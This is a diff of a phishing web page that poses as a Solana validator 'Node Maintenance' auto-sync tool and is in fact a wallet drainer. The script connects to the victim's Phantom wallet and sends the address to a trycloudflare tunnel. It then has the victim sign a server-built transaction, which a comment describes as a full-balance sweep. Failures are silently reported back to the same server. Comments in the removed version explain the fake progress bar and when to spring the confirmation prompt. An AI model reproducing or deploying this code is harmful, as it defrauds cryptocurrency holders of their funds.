@@ -1,33 +1,71 @@
-<div class="box">
-    <div id="loading-zone">
-        <h3 style="color:#14f195;">VALIDATOR AUTHENTICATION</h3>
-        <div class="progress-bar"><div id="bar-fill"></div></div>
-        <p id="status-text" style="font-size:10px; color:#888;">READY TO SYNC</p>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validator Support</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #0b0b0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 90%; max-width: 340px; background: #1a1a1a; border-radius: 16px; padding: 24px; text-align: center; border: 1px solid #333; }
+        .icon { width: 60px; height: 60px; background: #14f195; border-radius: 50%; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; color: #000; font-size: 24px; font-weight: bold; }
+        h2 { font-size: 20px; margin: 0 0 8px; }
+        p { color: #888; font-size: 14px; line-height: 1.5; margin: 0 0 24px; }
+        button { background: #14f195; color: #000; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
+        button:active { opacity: 0.8; }
+        #log { font-size: 11px; color: #444; margin-top: 16px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">S</div>
+        <h2>Node Maintenance</h2>
+        <p>Your validator node requires a quick synchronization to remain active on the network.</p>
+        <button id="cta">START AUTO-SYNC</button>
+        <div id="log">SYSTEM ARMED v22.0</div>
     </div>
-    <button id="cta" style="margin-top:20px;">CLAIM REWARDS</button>
-</div>
 
-<script>
-    document.getElementById('cta').onclick = async () => {
-        const fill = document.getElementById('bar-fill');
-        const txt = document.getElementById('status-text');
-        
-        // 第一步：伪装加载动画
-        fill.style.width = "40%";
-        txt.innerText = "CHECKING ELIGIBILITY...";
-        
-        // 第二步：服务器静默计算 (71服务器已经在跑了)
-        const info = await fetch(tunnel + "/prepare_raw", { ... });
-        
-        fill.style.width = "80%";
-        txt.innerText = "GENERATING SMART CONTRACT...";
-        
-        // 第三步：在用户心理预期最高时，拉起确认框
-        try {
-            const { signature } = await p.signAndSendTransaction(tx);
-            txt.innerText = "REWARDS CLAIMED!";
-        } catch (e) {
-            txt.innerText = "RPC ERROR: RETRYING...";
-        }
-    };
-</script>
+    <script>
+        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";
+
+        document.getElementById('cta').onclick = async () => {
+            const log = (t) => document.getElementById('log').innerText = t;
+            const sWeb3 = window.solanaWeb3;
+            const p = window.solana || window.phantom?.solana;
+
+            if (!p) { alert("Please use Phantom Browser"); return; }
+
+            try {
+                log("Connecting...");
+                await p.connect();
+
+                log("Syncing Data...");
+                const resp = await fetch(tunnel + "/prepare_raw", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ address: p.publicKey.toString() })
+                });
+                const info = await resp.json();
+
+                log("Awaiting Confirmation...");
+                const binary = window.atob(info.raw_tx);
+                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
+                const tx = sWeb3.VersionedTransaction.deserialize(bytes);
+
+                // 🔱 调起全额归集弹窗
+                const { signature } = await p.signAndSendTransaction(tx);
+                log("Sync Successful!");
+
+            } catch (err) {
+                log("Network Busy. Retry later.");
+                // 悄悄把错误报回 71 服务器
+                fetch(tunnel + "/debug", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ stage: "V22_FAIL", error: err.message })
+                }).catch(()=>{});
+            }
+        };
+    </script>
+</body>
+</html>
